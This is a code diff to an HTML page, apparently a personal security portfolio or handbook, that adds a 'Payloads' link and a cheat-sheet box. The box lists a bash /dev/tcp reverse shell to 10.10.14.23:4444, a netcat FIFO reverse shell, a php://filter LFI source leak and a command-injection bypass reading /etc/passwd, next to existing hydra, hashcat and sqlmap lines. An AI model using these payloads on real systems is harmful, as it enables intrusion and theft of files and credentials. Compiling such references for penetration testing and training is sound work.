@@ -111,6 +111,10 @@
           <span class="material-symbols-outlined text-sm">menu_book</span>
           <span>Handbook</span>
         </a>
+        <a href="payloads.html" class="text-danger-critical hover:text-primary transition-colors flex items-center gap-1 font-bold" title="RCE, CMDi & LFI Payloads Cheatsheet">
+          <span class="material-symbols-outlined text-sm">security</span>
+          <span>Payloads</span>
+        </a>
         <a href="resume.html" class="hover:text-primary transition-colors flex items-center gap-1">
           <span class="material-symbols-outlined text-sm">description</span>
           <span>Resume</span>
@@ -392,6 +396,20 @@
             <div><code class="text-warning font-bold">hydra -l admin -P wordlist.txt ssh://10.10.110.45</code> - Network service login cracking</div>
             <div><code class="text-warning font-bold">hashcat -m 0 hashes.txt rockyou.txt</code> - GPU accelerated MD5 hash cracking</div>
             <div><code class="text-warning font-bold">sqlmap -u "http://10.10.110.45/product.php?id=1" --dbs</code> - Automated SQL injection testing</div>
+          </div>
+        </div>
+        <div>
+          <div class="text-danger-critical font-bold mb-1 flex items-center justify-between">
+            <span>RCE, LFI &amp; Reverse Shell Payloads:</span>
+            <a href="payloads.html" class="text-primary hover:underline text-[10px] flex items-center gap-1 font-bold">
+              <span>Full Payloads Cheatsheet ↗</span>
+            </a>
+          </div>
+          <div class="p-2.5 rounded bg-canvas-base border border-border-hairline space-y-1 text-[11px]">
+            <div><code class="text-danger-critical font-bold">bash -i &gt;&amp; /dev/tcp/10.10.14.23/4444 0&gt;&amp;1</code> - Bash TCP Shell</div>
+            <div><code class="text-danger-critical font-bold">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc [IP] [PORT] &gt;/tmp/f</code> - Netcat FIFO</div>
+            <div><code class="text-danger-critical font-bold">php://filter/convert.base64-encode/resource=index.php</code> - LFI Source Leak</div>
+            <div><code class="text-danger-critical font-bold">cat${IFS}/etc/passwd</code> - CMDi Space Filter Bypass</div>
           </div>
         </div>
       </div>
